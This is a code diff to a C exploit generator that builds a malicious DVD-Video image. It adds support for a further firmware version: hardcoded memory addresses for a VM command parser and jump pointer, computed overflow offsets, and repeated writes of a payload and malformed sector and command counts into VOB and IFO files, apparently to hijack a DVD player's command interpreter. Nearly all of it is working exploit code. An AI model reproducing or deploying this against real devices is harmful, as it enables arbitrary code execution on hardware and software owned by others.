@@ -136,10 +136,6 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
     return 0;
 }
 
-#define VOB_PATCH_1_LOC 0x644
-#define IFO_PGC_PATCH_LOC 0xcc
-#define NEW_PGC_SECT "\x00\x00\x00\x32"
-
 #ifdef V300E
 #define VM_CMD_PARSER_SWITCH_ADDR 0x00909208
 #define VM_ADDR 0x01558e40
@@ -244,6 +240,29 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
 #define DR_ADDR 0x01273940
 #define IFO_BUFFER 0x0126f940
 #define VM_PATCH_START_POS 424
+#elif V310X
+#define VM_CMD_PARSER_SWITCH_ADDR 0x005b9d40
+#define VM_ADDR 0x01412840
+#define VOB_BUFFER_ADDR 0x01417200
+#define JUMP_POINTER 0x5F9C48
+//#define JUMP_POINTER 0x006a6800
+#define CMD_DATA_ADDR 0x0140bdd4
+#define DR_ADDR 0x0140bdd4
+#define IFO_BUFFER 0x0140de40
+#define VM_PATCH_START_POS 25108
+#endif
+
+// 0x005b9d40 0x5f9d3c
+
+#define IFO_PGC_PATCH_LOC 0xcc
+#define NEW_PGC_SECT "\x00\x00\x00\x32"
+#if V310X
+#define VOB_DIFF_RAW (0x01500014 - VOB_BUFFER_ADDR)
+#define VOB_REM_RAW (VOB_DIFF_RAW % 0x810)
+#define VOB_DIV_RAW (VOB_DIFF_RAW / 0x810)
+#define VOB_PATCH_1_LOC ((VOB_DIV_RAW * 0x800) + ((VOB_REM_RAW > 12) ? (VOB_REM_RAW - 12) : 0))
+#else
+#define VOB_PATCH_1_LOC 0x644
 #endif
 
 #define CTRL_DATA_ADDR (VOB_BUFFER_ADDR + 0x0c + 0x629)
@@ -294,8 +313,20 @@ int generate_exploit_pgc(char *out_path, uint32_t off, uint32_t len, uint32_t ea
 #define DR_STRM_3 (((IFO_BUFFER + C_DR_LBA_REM(423) + 1) >> 24) & 0xff)
 
 #define BUFFER_END (IFO_BUFFER + 0x4000)
-#elif V304X
+#elif V304X || V310X
 #define VM_PATCH_LOC (VM_ADDR - (DR_ADDR + VM_PATCH_START_POS))
+#endif
+
+#if V303X || V304X || V310X
+#define _MI_LOC (IFO_CMDT_PATCH_LOC + 8 + NEEDED_LEN)
+#define _MI_SC ((_MI_LOC >> 11) + ((_MI_LOC % 0x800) ? 1 : 0))
+#define MI_SC ((_MI_SC & ~19) + ((_MI_SC % 20) ? 20 : 0))
+#define MI_EA (MI_SC - 1)
+#if V310X
+#define MI_BEA ((MI_SC << 1) + 511)
+#else
+#define MI_BEA ((MI_SC << 1) + 43)
+#endif
 #endif
 
 int main() {
@@ -369,6 +400,81 @@ int main() {
         return -1;
     }
 #endif
+#if V310X
+    uint8_t packs[0x10800];
+    fseek(fp, 22528, SEEK_SET);
+    if (fread(packs, 1, 0x10800, fp) != 0x10800) {
+        fprintf(stderr, "Error: Failed to read packs from VOB\n");
+        free(payload);
+        fclose(fp);
+        return -1;
+    }
+
+    uint8_t pack[2048] = {0};
+    uint32_t fl = (VOB_DIV_RAW + 1) * 0x800;
+    uint32_t fls = fl / 0x800;
+    uint32_t fls2 = fls + 13;
+
+    packs[0x2d] = (fls >> 24) & 0xff;
+    packs[0x2e] = (fls >> 16) & 0xff;
+    packs[0x2f] = (fls >> 8) & 0xff;
+    packs[0x30] = fls & 0xff;
+
+    packs[0x40b] = (fls >> 24) & 0xff;
+    packs[0x40c] = (fls >> 16) & 0xff;
+    packs[0x40d] = (fls >> 8) & 0xff;
+    packs[0x40e] = fls & 0xff;
+
+    packs[0x682d] = (fls2 >> 24) & 0xff;
+    packs[0x682e] = (fls2 >> 16) & 0xff;
+    packs[0x682f] = (fls2 >> 8) & 0xff;
+    packs[0x6830] = fls2 & 0xff;
+
+    packs[0x6c0b] = (fls2 >> 24) & 0xff;
+    packs[0x6c0c] = (fls2 >> 16) & 0xff;
+    packs[0x6c0d] = (fls2 >> 8) & 0xff;
+    packs[0x6c0e] = fls2 & 0xff;
+
+    fseek(fp, fl, SEEK_SET);
+    if (fwrite(packs, 1, 0x10800, fp) != 0x10800) {
+        fprintf(stderr, "Error: Failed to write packs to VOB\n");
+        free(payload);
+        fclose(fp);
+        return -1;
+    }
+
+    uint8_t vea[4] = {
+        (VOB_DIV_RAW >> 24) & 0xff,
+        (VOB_DIV_RAW >> 16) & 0xff,
+        (VOB_DIV_RAW >> 8) & 0xff,
+        VOB_DIV_RAW & 0xff
+    };
+
+    fseek(fp, 0x40f, SEEK_SET);
+    if (fwrite(vea, 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write ea to VOB\n");
+        free(payload);
+        fclose(fp);
+        return -1;
+    }
+
+    for (int i = 22528; i < fl; i += 2048) {
+        fseek(fp, i, SEEK_SET);
+        if (fwrite(pack, 1, 2048, fp) != 2048) {
+            fprintf(stderr, "Error: Failed to write pack to VOB\n");
+            free(payload);
+            fclose(fp);
+            return -1;
+        }
+    }
+    fseek(fp, 1048575, SEEK_SET);
+    if (fwrite("\x00", 1, 1, fp) != 1) {
+        fprintf(stderr, "Error: Failed to write pad to VOB\n");
+        free(payload);
+        fclose(fp);
+        return -1;
+    }
+#endif
     fseek(fp, VOB_PATCH_1_LOC, SEEK_SET);
     if (fwrite(payload, 1, payload_len, fp) != payload_len) {
         fprintf(stderr, "Error: Failed to write payload to VOB\n");
@@ -378,12 +484,68 @@ int main() {
     }
     free(payload);
     fclose(fp);
-#if V303X || V304X
+#if V303X || V304X || V310X
+#if V310X
+    fp = fopen("./build/fs/VIDEO_TS/VTS_01_0.IFO", "rb+");
+    if (!fp) {
+        fprintf(stderr, "Error: Failed to open VTS_01_0.IFO\n");
+        return -1;
+    }
+
+    uint8_t bf[8] = {
+        (fls >> 24) & 0xff,
+        (fls >> 16) & 0xff,
+        (fls >> 8) & 0xff,
+        fls & 0xff,
+        (fls2 >> 24) & 0xff,
+        (fls2 >> 16) & 0xff,
+        (fls2 >> 8) & 0xff,
+        fls2 & 0xff
+    };
+
+    fseek(fp, 0x111e, SEEK_SET);
+    if (fwrite(&bf[4], 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x2808, SEEK_SET);
+    if (fwrite(bf, 1, 8, fp) != 8) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x2010, SEEK_SET);
+    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x0c, SEEK_SET);
+    if (fwrite("\x00\x00\x02\x0b", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x1122, SEEK_SET);
+    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fclose(fp);
+#endif
     fp = fopen("./build/fs/VIDEO_TS/VTS_02_0.IFO", "rb+");
     if (!fp) {
         fprintf(stderr, "Error: Failed to open VTS_02_0.IFO\n");
         return -1;
     }
+
     fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
     
     if (fwrite("\x00\x01\x00\x00", 1, 4, fp) != 4) {
@@ -391,6 +553,44 @@ int main() {
         fclose(fp);
         return -1;
     }
+
+#if V310X
+    fseek(fp, 0x111e, SEEK_SET);
+    if (fwrite(&bf[4], 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x2808, SEEK_SET);
+    if (fwrite(bf, 1, 8, fp) != 8) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x2010, SEEK_SET);
+    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x0c, SEEK_SET);
+    if (fwrite("\x00\x00\x02\x0b", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x1122, SEEK_SET);
+    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+#endif
+
     fclose(fp);
 
     fp = fopen("./build/fs/VIDEO_TS/VTS_03_0.IFO", "rb+");
@@ -406,14 +606,76 @@ int main() {
         return -1;
     }
 
+#if V310X
+    fseek(fp, 0x111e, SEEK_SET);
+    if (fwrite(&bf[4], 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x2808, SEEK_SET);
+    if (fwrite(bf, 1, 8, fp) != 8) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x2010, SEEK_SET);
+    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+    
+    fseek(fp, 0x2808, SEEK_SET);
+    if (fwrite(bf, 1, 8, fp) != 8) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x0c, SEEK_SET);
+    if (fwrite("\x00\x00\x02\x0b", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x1122, SEEK_SET);
+    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+#endif
+
     fclose(fp);
 
-    uint32_t tmp = MAX(NEEDED_LEN / 8, 1);
+    uint32_t tmp = MAX(
+        (
+            (NEEDED_LEN >> 3) +
+            ((NEEDED_LEN % 8) ? 1 : 0)
+        ),
+        1
+    );
+    uint32_t tmp_pre = tmp, tmp_post = 0, tmp_cell = 0;
+    if (tmp > 0xffff) {
+        tmp_pre = 0xffff;
+        tmp_post = tmp - 0xffff;
+    }
+    if (tmp > 0x1fffe) {
+        tmp_post = 0xffff;
+        tmp_cell = tmp - 0x1fffe;
+    }
+    if (tmp > 0x2fffd) {
+        tmp_cell = 0xffff;
+    }
 
     uint8_t ifo_patch_buf[16] = {
-        (tmp >> 8) & 0xff, tmp & 0xff, // CMDT_PRE_CNT
-        0, 0, // CMDT_POST_CNT
-        0, 0, // CMDT_CELL_CNT
+        (tmp_pre >> 8) & 0xff, tmp_pre & 0xff, // CMDT_PRE_CNT
+        (tmp_post >> 8) & 0xff, tmp_post & 0xff, // CMDT_POST_CNT
+        (tmp_cell >> 8) & 0xff, tmp_cell & 0xff, // CMDT_CELL_CNT
         0, 15, // CMDT_EA
         0, 48, 0, 0, 0, 0, 0, 0 // BROKEN_CMD
     };
@@ -423,6 +685,29 @@ int main() {
         fprintf(stderr, "Error: Failed to open VTS_04_0.IFO\n");
         return -1;
     }
+
+#if V310X
+    fseek(fp, 0x111e, SEEK_SET);
+    if (fwrite(&bf[4], 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x2808, SEEK_SET);
+    if (fwrite(bf, 1, 8, fp) != 8) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x2010, SEEK_SET);
+    if (fwrite("\x00\x00\x01\xff", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+#endif
 
     fseek(fp, IFO_CMDT_PATCH_LOC, SEEK_SET);
     
@@ -448,10 +733,10 @@ int main() {
     // ifo end sector
     fseek(fp, 0x1c, SEEK_SET);
 
-    ifo_patch_buf[0] = 0;
-    ifo_patch_buf[1] = 0;
-    ifo_patch_buf[2] = 0;
-    ifo_patch_buf[3] = 19;
+    ifo_patch_buf[0] = (MI_EA >> 24) & 0xff;
+    ifo_patch_buf[1] = (MI_EA >> 16) & 0xff;
+    ifo_patch_buf[2] = (MI_EA >> 8) & 0xff;
+    ifo_patch_buf[3] = MI_EA & 0xff;
     
     if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
         fprintf(stderr, "Error: Failed to write to IFO\n");
@@ -462,10 +747,10 @@ int main() {
     // vob start sector
     fseek(fp, 0xc4, SEEK_SET);
 
-    ifo_patch_buf[0] = 0;
-    ifo_patch_buf[1] = 0;
-    ifo_patch_buf[2] = 0;
-    ifo_patch_buf[3] = 20;
+    ifo_patch_buf[0] = (MI_SC >> 24) & 0xff;
+    ifo_patch_buf[1] = (MI_SC >> 16) & 0xff;
+    ifo_patch_buf[2] = (MI_SC >> 8) & 0xff;
+    ifo_patch_buf[3] = MI_SC & 0xff;
     
     if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
         fprintf(stderr, "Error: Failed to write to IFO\n");
@@ -476,10 +761,10 @@ int main() {
     // bup end sector
     fseek(fp, 0x0c, SEEK_SET);
 
-    ifo_patch_buf[0] = 0;
-    ifo_patch_buf[1] = 0;
-    ifo_patch_buf[2] = 0;
-    ifo_patch_buf[3] = 83;
+    ifo_patch_buf[0] = (MI_BEA >> 24) & 0xff;
+    ifo_patch_buf[1] = (MI_BEA >> 16) & 0xff;
+    ifo_patch_buf[2] = (MI_BEA >> 8) & 0xff;
+    ifo_patch_buf[3] = MI_BEA & 0xff;
     
     if (fwrite(ifo_patch_buf, 1, 4, fp) != 4) {
         fprintf(stderr, "Error: Failed to write to IFO\n");
@@ -487,15 +772,15 @@ int main() {
         return -1;
     }
 
-    // expand file to 20 sectors
-    fseek(fp, 40959, SEEK_SET);
+    // expand file to MI_SC sectors
+    fseek(fp, (MI_SC << 11) - 1, SEEK_SET);
     if (fwrite("\x00", 1, 1, fp) != 1) {
         fprintf(stderr, "Error: Failed to write to IFO\n");
         fclose(fp);
         return -1;
     }
 
-#if V304X
+#if V304X || V310X
     fclose(fp);
 
     fp = fopen("./build/fs/VIDEO_TS/VIDEO_TS.IFO", "rb+");
@@ -588,6 +873,57 @@ int main() {
         fclose(fp);
         return -1;
     }
+
+#if V310X
+    fseek(fp, 0x0c, SEEK_SET);
+    if (fwrite("\x00\x00\x00\x37", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x1c, SEEK_SET);
+    if (fwrite("\x00\x00\x00\x1b", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x810, SEEK_SET);
+    if (fwrite("\x00\x00\x00\x38", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x81c, SEEK_SET);
+    if (fwrite("\x00\x00\x02\x44", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x828, SEEK_SET);
+    if (fwrite("\x00\x00\x04\x50", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 0x834, SEEK_SET);
+    if (fwrite("\x00\x00\x06\x5c", 1, 4, fp) != 4) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+
+    fseek(fp, 57343, SEEK_SET);
+    if (fwrite("\x00", 1, 1, fp) != 1) {
+        fprintf(stderr, "Error: Failed to write to IFO\n");
+        fclose(fp);
+        return -1;
+    }
+#endif
 
     fclose(fp);
 #elif V302X
